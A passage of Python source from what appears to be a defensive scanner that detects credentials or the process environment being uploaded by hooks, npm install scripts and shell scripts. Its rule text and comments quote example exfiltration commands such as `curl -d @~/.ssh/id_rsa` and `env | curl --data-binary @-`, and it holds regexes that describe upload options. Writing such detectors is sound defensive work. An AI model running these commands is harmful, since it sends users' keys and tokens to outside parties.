                isinstance(n, (ast.Return, ast.Yield, ast.YieldFrom)) and n.value is not None
                and scope_of(n) is fn and carries(n.value, fn, inner)
                for n in ast.walk(fn)
            )
        return returned[key]

    def spread(tainted: Tainted, among: list[ast.AST]) -> None:
        for _ in range(4):
            grown = False
            for node in among:
                value = node.value
                scope = scope_of(node)
                if value is None or not carries(value, scope, tainted):
                    continue
                targets = node.targets if isinstance(node, ast.Assign) else [node.target]
                for target in targets:
                    # `payload["env"] = os.environ` fills the payload; `self.process = Popen(...)`
                    # does not make `self` the environment. Following attributes to their base
                    # marked `self` in a large server and, through it, hundreds of unrelated names.
                    if isinstance(target, ast.Attribute):
                        continue
                    while isinstance(target, ast.Subscript):
                        target = target.value
                    if isinstance(target, ast.Name) and (scope, target.id) not in tainted:
                        tainted.add((scope, target.id))
                        grown = True
            if not grown:
                break

    assignments = [
        n for n in ast.walk(tree) if isinstance(n, (ast.Assign, ast.AnnAssign, ast.AugAssign))
    ]
    tainted: Tainted = set()
    spread(tainted, assignments)

    found: list[Evidence] = []
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call) or not isinstance(node.func, (ast.Name, ast.Attribute)):
            continue
        name = imports.dotted(node.func) or ""
        head, _, leaf = name.partition(".")
        leaf = name.rsplit(".", 1)[-1]
        module_send = head in _PY_NET_MODULES and leaf in _PY_SEND_LEAVES
        method_send = (
            isinstance(node.func, ast.Attribute) and node.func.attr in _PY_METHOD_SENDS
            and head not in imports.modules and head not in imports.names
        )
        if not (module_send or method_send):
            continue
        args = [*node.args, *(k.value for k in node.keywords)]
        if any(carries(a, scope_of(node), tainted) for a in args):
            end = getattr(node, "end_lineno", None) or node.lineno
            found.append(f.evidence_for_lines(node.lineno, end))
            if len(found) >= MAX_EVIDENCE_SCANNED:
                break
    return found


class SecretExfilScanner(Scanner):
    name = "secret_exfil"
    rules = [
        RuleSpec(
            id=RULE_ID,
            category="exfiltration_path",
            severity=Severity.HIGH,
            title="Credentials or the whole environment sent off the machine",
            description=(
                "One command or call reads a credential and sends it over the network. Either a "
                "command an agent or editor runs on its own (a hook, an MCP server's launch "
                "command, a status line or credential helper, a plugin monitor) or an npm "
                "install-time script uploads a key or credential file, a login token or the "
                "environment (`curl -d @~/.ssh/id_rsa`, `env | curl --data-binary @-`), directly "
                "or through a shell script that collects it into a file or variable and sends "
                "that on a later line, or code passes the whole process environment "
                "(`process.env`, `os.environ`) into an HTTP request. The environment holds the "
                "machine's tokens and keys, so either way they reach whoever runs the endpoint."
            ),
            recommendation=(
                "Do not install the component or open the project in an agent. Remove the "
                "command or call; if it already ran, rotate every credential the machine and its "
                "environment held."
            ),
            capability=Capability.NETWORK_EGRESS,
            threat_class=ThreatClass.MALICIOUS_INDICATOR,
        ),
    ]

    def scan(self, index: FileIndex) -> ScanResult:
        evidence: list[Evidence] = []
        by_path = {f.relpath: f for f in index.files}
        for command in autorun_commands(index).commands:
            if command.is_http:
                continue
            ev = _command_evidence(command)
            if ev is None:
                ev = _script_evidence(command, by_path)
            if ev is not None:
                evidence.append(ev)
        evidence.extend(_install_evidence(index, by_path))
        partly: list[tuple[str, int | None]] = []
        for f in index.select(suffixes=_JS_SUFFIXES):
            sends, truncated = _js_env_sends(f)
            evidence.extend(sends)
            if truncated and not sends:
                partly.append((f.relpath, None))
            if len(evidence) >= MAX_EVIDENCE_SCANNED:
                break
        for f in index.select(suffixes=(".py", ".pyw")):
            evidence.extend(_py_env_dumps(f))
            if len(evidence) >= MAX_EVIDENCE_SCANNED:
                break
        # A file with more uses of the environment, or more calls beside them, than a real one
        # has was not searched to its end: say so rather than call it clean.
        needs_review = [aggregated_review(
            category="coverage",
            title=ENV_SEND_PARTLY_READ,
            places=partly,
            what="JavaScript file(s) hold more uses of process.env, or more calls beside them, "
                 "than the check for the environment being sent follows",
            advice="Part of each was not checked for sending the environment off the machine.",
        )] if partly else []
        if not evidence:
            return ScanResult(needs_review=needs_review)
        return ScanResult(findings=[_finding_from_rule(self.rules[0], evidence)],
                          needs_review=needs_review)


def _command_evidence(command: AutorunCommand) -> Evidence | None:
    text = command.text
    env = " ".join(p.text for p in command.env)
    span = secret_upload(text, env)
    if span is None:
        return None
    return command.evidence(command.piece_at(span[0]))


_SCRIPT_TOKEN = re.compile(r"[\w.${}/\\-]{1,300}\.(?:sh|bash|zsh|ps1)\b")
_SHELL_SUFFIXES = (".sh", ".bash", ".zsh", ".ps1")


def _script_evidence(command: AutorunCommand, by_path: dict[str, IndexedFile]) -> Evidence | None:
    """A shell script the command runs, shipped in the component, that uploads a credential."""
    return _run_script_evidence(command.text, command.file.relpath, by_path)


def _run_script_evidence(
    command: str, command_file: str, by_path: dict[str, IndexedFile]
) -> Evidence | None:
    """A shell script ``command`` (written in ``command_file``) runs, shipped in the component,
    that uploads a credential: in one line, or collected into a file or variable first and that
    sent by a later line."""
    near = command_file.split("/")[:-1]
    folders = [""] + ["/".join(near[:k]) for k in range(len(near), 0, -1)]
    for token in _SCRIPT_TOKEN.findall(command):
        cleaned = re.sub(r"^(?:\$\{?\w+\}?[\"']?[/\\])+", "", token)
        cleaned = re.sub(r"^(?:\.[/\\])+", "", cleaned).replace("\\", "/").lstrip("/")
        for folder in folders:
            script = by_path.get(f"{folder}/{cleaned}" if folder else cleaned)
            if script is None or script.suffix not in _SHELL_SUFFIXES:
                continue
            for line_no in range(1, len(script.text.splitlines()) + 1):
                line = script.line_text(line_no)
                if line.lstrip().startswith("#"):
                    continue
                span = secret_upload(line)
                if span is not None:
                    return script.evidence_for_lines(line_no, line_no)
            staged = staged_upload_lines(script.text.splitlines())
            if staged is not None:
                read_at, send_at = staged
                # Both lines when they are close together, else the send alone.
                first = read_at if send_at - read_at <= _STAGED_SPAN else send_at
                return script.evidence_for_lines(first, send_at)
    return None


# --- a script that collects a credential first and sends it on a later line ------------------
# The real install-time stealers (the wfx campaign, November 2026) never read and send in one
# command: `cat ~/.aws/credentials >> "$out"`, then `curl --data-binary @"$out" http://...`.
# A line that reads a credential (a credential path, the whole environment, a token command) and
# writes the result to a file (`> F`, `>> F`, `| tee F`) or a variable (`V=$(...)`) marks that
# file or variable; a later line in which a network client uploads it is the send. A marked name
# used as a header (`-H "Authorization: Bearer $TOKEN"`) is how a credential is used, not sent,
# and a provider's token sent to the provider's own hosts is its use too.
_REDIRECT_TO = re.compile(r"(?:>>?|\btee(?:\s+-a)?)\s*([\"']?)(\$\{?\w+\}?|[\w./~-]+)\1")
_ASSIGN_FROM = re.compile(r"^\s*(?:export\s+|local\s+|readonly\s+)?([A-Za-z_]\w*)=[\"']?(?:\$\(|`)")
# Where a network client takes data to upload. `@NAME` is curl's "the contents of this file".
_UPLOAD_OPTION = (
    r"(?:-d|--data(?:-binary|-raw|-urlencode|-ascii)?|-F|--form|-T|--upload-file|--post-file|"
    r"--post-data|--body-file|--body-data|-InFile|-Body)"
)
_MAX_STAGED_LINES = 5000
_STAGED_SPAN = 3


def _name_patterns(name: str) -> list[re.Pattern[str]]:
    """Ways a line can hand the marked file or variable ``name`` to a network client as data."""
    if name.startswith("$"):
        bare = re.escape(name.strip("${}"))
        ref = rf"\$\{{?{bare}\}}?(?![\w])"
    else:
        ref = rf"{re.escape(name)}(?![\w./-])"
    return [
        re.compile(rf"@[\"']?{ref}"),
        re.compile(rf"{_UPLOAD_OPTION}(?:\s+|=)[\"']?[^\s\"']*{ref}"),
        re.compile(rf"<\s*[\"']?{ref}"),
        re.compile(rf"\bcat\s+[\"']?{ref}[\"']?\s*\|"),
    ]


def staged_upload_lines(lines: list[str]) -> tuple[int, int] | None:
    """``(read_line, send_line)``, 1-based, of a credential collected into a file or variable on
    one line and uploaded by a network client on a later one, or None."""
    marked: dict[str, tuple[int, tuple[str, ...]]] = {}
    for no, raw in enumerate(lines[:_MAX_STAGED_LINES], start=1):
        if raw.lstrip().startswith("#"):
            continue
        line = _HOME.sub("~", raw)
        if marked and (_NET_CLIENT.search(line) or _INLINE_NET.search(line)):
            hosts = _hosts(line)
            for name, (read_at, own_hosts) in marked.items():
                if own_hosts and hosts and all(h.endswith(own_hosts) for h in hosts):
                    continue
                if any(p.search(line) for p in _name_patterns(name)):
                    return read_at, no
        source = _credential_source(line)
        if source is None:
            continue
        at, own_hosts = source
        names = [m.group(2) for m in _REDIRECT_TO.finditer(line, at)]
        assign = _ASSIGN_FROM.match(line)
        if assign and assign.end() <= at:
            names.append("$" + assign.group(1))
        for name in names:
            if name.startswith("/dev/"):
                continue
            marked.setdefault(name, (no, own_hosts))
    return None


def _credential_source(line: str) -> tuple[int, tuple[str, ...]] | None:
    """Offset of what the line reads that holds credentials, and the hosts it may go to, or None."""
    for m in _STRONG_PATHS.finditer(line):
        if _METADATA.match(m.group(0)) or _HANDED_TO_CLIENT.search(_stage_before(line, m.start())):
            continue
        return m.start(), ()
    m = _ENV_DUMP.search(line)
    if m:
        return m.start(), ()
    for pattern, own_hosts in _TOKEN_COMMANDS:
        m = pattern.search(line)
        if m:
            return m.start(), own_hosts
    return None


def _install_evidence(index: FileIndex, by_path: dict[str, IndexedFile]) -> list[Evidence]:
    """npm install-time scripts that upload a credential, inline or through a script they run."""
    found: list[Evidence] = []
    for f in index.select(names=("package.json",)):
        for _name, command, start, end in npm_install_commands(f, _NPM_LIFECYCLE_SCRIPTS):
            if secret_upload(command) is not None:
                found.append(f.evidence_for_span(start, end))
                continue
            ev = _run_script_evidence(command, f.relpath, by_path)
            if ev is not None:
                found.append(ev)
    return found
